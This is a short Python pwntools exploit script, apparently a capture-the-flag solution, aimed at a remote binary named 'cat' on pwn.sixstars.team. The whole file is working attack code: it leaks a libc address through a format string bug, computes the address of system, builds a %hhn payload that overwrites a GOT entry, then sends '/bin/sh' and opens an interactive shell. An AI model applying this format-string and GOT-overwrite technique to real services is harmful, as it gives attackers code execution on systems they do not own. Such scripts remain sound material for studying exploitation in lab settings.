from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",22015)
#r=process("./cat")
elf=ELF("./cat")
libc=ELF("./x64_libc-2.23.so")


#print r.pid
#pause()
r.sendline("%9$s\x00\x00\x00\x00"+p64(0x601040))
a=r.recv(6)
scanf_addr=u64(a+"\x00\x00")
scanf_p=libc.sym['__isoc99_scanf']
libc.address=scanf_addr-scanf_p
print hex(libc.address)
system=libc.sym['system']
print hex(system)

payload=""
vec=[]
for i in range(4):
    s=hex(system)
    vec.append(int(s[12-2*i:14-2*i],16))
    if i==0:
        p1='%'+str(vec[0])+'c%14$hhn'
    else:
        while(vec[i]<vec[i-1]):
            vec[i]+=0x100
        p1='%'+str(vec[i]-vec[i-1])+'c%'+str(14+i)+'$hhn'
    payload+=p1

payload+='\x00'*(8-len(payload)%8)
for i in range(4):
    payload+=p64(0x601030+i)

print payload
r.sendline(payload)
r.recv()
r.sendline("/bin/sh")

r.interactive()
